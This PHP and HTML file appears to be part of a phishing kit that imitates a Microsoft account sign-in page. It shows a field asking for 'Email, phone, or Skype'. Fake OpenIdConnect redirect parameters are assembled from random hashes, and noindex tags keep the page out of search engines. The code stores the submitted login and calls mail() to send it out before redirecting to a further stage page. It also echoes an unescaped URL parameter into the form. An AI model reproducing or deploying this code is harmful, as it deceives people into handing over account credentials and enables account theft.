<?php

session_start();

if (isset($_GET['email'])) {

	$email = $_GET['email'];
}

$oslo=rand(); 
$praga=md5($oslo);
$src = strtoupper("$praga");

if (isset($_POST['login'])) { 
$_SESSION["login"] = $login = $_POST["login"];

if ((!filter_var($login, FILTER_VALIDATE_EMAIL)) || empty($login)) {
header("Location: logins.php?client_id=$oslo$oslo&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties$src$src$src$src$src&email=$login&ui_locales=en-US&mkt=en-US&client-request-id=$praga");
}
else {
mail($to,$subject,$message,$headers);
	header("Location: logsrf.php?client_id=$oslo$oslo&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties$src$src$src$src$src&email=$login&ui_locales=en-US&mkt=en-US&client-request-id=$praga");
}

}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Sign In</title>
<meta http-equiv="content-type" content="text/html; charset=iso-8859-1">
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="robots" content="noindex">
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="noindex">
<meta name="googlebot" content="noindex">
<meta name="googlebot-news" content="nosnippet">
<meta http-equiv="Cache-Control" content="no-store">
<meta http-equiv="Cache-Control" content="no-cache">
<meta http-equiv="Cache-Control" content="private">
<meta http-equiv="Pragma" content="no-cache">
<link rel="icon" type="images/png" sizes="16*16" href="images/favicon.ico">
<style>


element {
}
input[type="color"]:hover, input[type="date"]:hover, input[type="datetime"]:hover, input[type="datetime-local"]:hover, input[type="email"]:hover, input[type="month"]:hover, input[type="number"]:hover, input[type="password"]:hover, input[type="search"]:hover, input[type="tel"]:hover, input[type="text"]:hover, input[type="time"]:hover, input[type="url"]:hover, input[type="week"]:hover, textarea:hover, select:hover {
    border-color: #323232;
    border-color: rgba(0,0,0,0.8);
}
input[type="color"], input[type="date"], input[type="datetime"], input[type="datetime-local"], input[type="email"], input[type="month"], input[type="number"], input[type="password"], input[type="search"], input[type="tel"], input[type="text"], input[type="time"], input[type="url"], input[type="week"] {
    border-top-width: 0;
    border-left-width: 0;
    border-right-width: 0;
    padding-left: 0;
}
input[type="color"], input[type="date"], input[type="datetime"], input[type="datetime-local"], input[type="email"], input[type="month"], input[type="number"], input[type="password"], input[type="search"], input[type="tel"], input[type="text"], input[type="time"], input[type="url"], input[type="week"], textarea, select {
    padding: 6px 10px;
    padding-left: 10px;
    border-width: 1px;
    border-top-width: 1px;
    border-right-width: 1px;
    border-left-width: 1px;
    border-color: #666;
    border-color: rgba(0,0,0,0.6);
    height: 36px;
    outline: none;
    border-radius: 0;
    -webkit-border-radius: 0;
}
input[type="color"], input[type="date"], input[type="datetime"], input[type="datetime-local"], input[type="email"], input[type="month"], input[type="number"], input[type="password"], input[type="search"], input[type="tel"], input[type="text"], input[type="time"], input[type="url"], input[type="week"], textarea {
    padding: 4px 8px;
    border-style: solid;
    border-width: 2px;
    border-color: rgba(0,0,0,0.4);
    background-color: rgba(255,255,255,0.4);
    height: 32px;
    height: 2rem;
}
.ltr_override, .dirltr {
    direction: ltr;
}
.form-control {
    display: block;
    width: 100%;
    background-image: none;
}
input, button, textarea, select, option, progress {
    max-width: 100%;
    line-height: inherit;
}
input, button, select, textarea {
    font-family: inherit;
    font-size: inherit;
    line-height: inherit;
}
input {
    line-height: normal;
}
button, input, optgroup, select, textarea {
    color: inherit;
    font: inherit;
        font-size: inherit;
        line-height: inherit;
        font-family: inherit;
    margin: 0;
}
* {
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
}
body.cb {
    color: #262626;
    text-align: left;
}
body.cb {
    text-align: center;
}
body {
    direction: ltr;
}
body {
    font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
    font-size: 15px;
    line-height: 20px;
    font-weight: 400;
    font-size: .9375rem;
    line-height: 1.25rem;
    color: #000;
}
html {
    font-size: 100%;
}
html {
    font-family: sans-serif;
    -webkit-text-size-adjust: 100%;
}
</style>
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>
</head>
<body style="visibility: visible;" onload="unhideBody()" bgcolor="">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1366px; height:659px; z-index:0">
<img src="images/a.jpg" alt="" title="" width="1366" border="0" height="659">
</div>
<div id="image3" style="position: absolute; overflow:hidden; left:473px; top:133px; width:440px; height:338px; z-index:1">
<img src="images/b.png" alt="" title="" border=0 width=440 height=338></a>
</div>
<div id="image3" style="position: absolute; overflow:hidden; left:518px; top:315px; z-index:4">
<a href="#"><img src="images/n.png" alt="" title="" border=0 width=156 height=19></a>
</div>
<div id="image3" style="position: absolute; overflow:hidden; left:595px; top:351px; z-index:5">
<a href="#"><img src="images/k.png" alt="" title="" border=0 width=68 height=19></a>
</div>
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:632px; width:1366px; height:27px; z-index:7">
<img src="images/d.png" alt="" title="" width="1366" border="0" height="29">
</div>
<form id="loginfmt" action="#" name="loginfmt" method="post">
<div>
<input name="login" id="i0116" maxlength="113" class="form-control ltr_override" value="<?php if (isset($_GET['email'])) { echo $email ; }?>" placeholder="Email, phone, or Skype" aria-label="Enter your email, phone, or Skype." type="text" lang="en" style="position:absolute;width: 350px;height: 36px;left: 519px;top: 262px;border-top-width: 0;border-left-width: 0;border-right-width: 0;padding-left: 0;px;border-style: solid;border:0px;z-index:3">
</div>
<div id="formimage1" style="position:absolute; left:760px; top:394px; z-index:6">
<input name="formimage1" src="images/c.png" width="108" type="image" height="32">
</div>
</form>
</body>
</html>